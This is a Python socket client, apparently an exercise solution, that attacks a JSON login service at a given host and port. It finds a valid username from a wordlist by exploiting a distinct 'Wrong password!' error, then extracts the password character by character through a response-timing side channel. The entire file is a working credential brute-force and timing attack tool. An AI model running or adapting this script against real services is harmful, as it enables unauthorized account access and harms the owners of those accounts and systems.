import argparse
import json
import logging
import socket
from string import ascii_lowercase, ascii_uppercase, digits
from time import time
from typing import Iterator

logging.basicConfig(format="%(levelname)s:%(message)s", level="DEBUG")
CHARSET = ascii_lowercase + ascii_uppercase + digits


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    return parser.parse_args()


def login_generator() -> Iterator[str]:
    with open("logins.txt", "r", encoding="utf-8") as f:
        for login in f:
            yield login.strip()


def send_socket_request(
    _client_socket: socket.socket, login: str, password: str
) -> dict:
    _client_socket.send(
        json.dumps({"login": login, "password": password}).encode(),
    )
    resp = _client_socket.recv(1024)
    return json.loads(resp.decode())


def create_connection(args):
    _client_socket = socket.socket()
    _client_socket.connect((args.host, int(args.port)))
    return _client_socket


def find_login(client_socket) -> str:
    start_password = "1"
    logins = login_generator()
    for login in logins:
        response = send_socket_request(client_socket, login, start_password)
        if response["result"] == "Wrong password!":
            logging.info(f"found {login=}")
            return login

    logging.error("login not found")
    raise ValueError


def find_password(client_socket, login: str, args):
    password = ""
    logging.info("Starting password finding...")

    while True:
        for char in CHARSET:
            test_password = password + char
            logging.info(f"Testing password: {test_password}")
            start = time()
            response = send_socket_request(client_socket, login, test_password)
            end = time()
            resp_time = end - start

            if response.get("result") == "Connection success!":
                logging.info(f"Password found: {test_password}")
                return test_password
            elif resp_time > 0.01:
                logging.info(f"Password character found: {char}")
                password += char
                break
            else:
                logging.info(f"{char} did not match. Current password: {password=} {resp_time=}")
        else:
            logging.error("Password search failed: No matching characters.")
            raise RuntimeError("Password search failed: No matching characters.")


def main():
    args = parse_arguments()
    logging.info(f"starting bruteforce with {args=}")
    client_socket = create_connection(args)
    try:
        login = find_login(client_socket)
        password = find_password(client_socket, login, args)
        print(json.dumps({"login": login, "password": password}))
    except Exception as exc:
        raise exc
    finally:
        client_socket.close()


if __name__ == "__main__":
    main()
